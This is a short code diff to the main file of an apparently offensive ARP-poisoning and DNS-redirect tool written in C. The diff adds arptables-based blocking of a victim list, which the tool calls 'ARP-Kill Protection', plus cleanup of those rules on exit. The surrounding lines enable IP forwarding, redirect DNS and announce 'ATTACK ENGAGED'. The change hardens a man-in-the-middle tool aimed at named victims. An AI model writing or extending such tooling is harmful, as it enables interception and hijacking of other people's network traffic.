@@ -9,6 +9,7 @@
 #include "ARP/ARP_UTILS/arp_scan.h"
 #include "ARP/ARP_UTILS/utils_discovery.h"
 #include "ARP/ARP_UTILS/utils_iptables.h"
+#include "ARP/ARP_UTILS/utils_firewall.h"
 int g_victim_count = 0;
 struct Victim *g_victims = NULL;
 unsigned char g_gateway_ip[4];
@@ -25,6 +26,10 @@ void handle_sigint(int sig) {
   }
   // Revert iptables rules
   cleanup_dns_redirect();
+  
+  // Revert arptables rules
+  cleanup_arp_block();
+
   if (g_mac_alloc)
     free(g_mac_alloc);
   exit(EXIT_SUCCESS);
@@ -145,6 +150,10 @@ int main(int argc, char *argv[]) {
   enable_ip_forwarding();
   printf("[*] Integrating with Technitium DNS...\n");
   setup_dns_redirect();
+
+  // ARP-Kill Protection Strategy
+  setup_arp_block(g_gateway_mac, g_victims, g_victim_count);
+
   // Launch Loop
   printf("\n[*] >>> ATTACK ENGAGED : ARP poisoning Engine active! <<<\n");
   printf("[*] (Press Ctrl+C to cleanly heal the network and exit)\n\n");
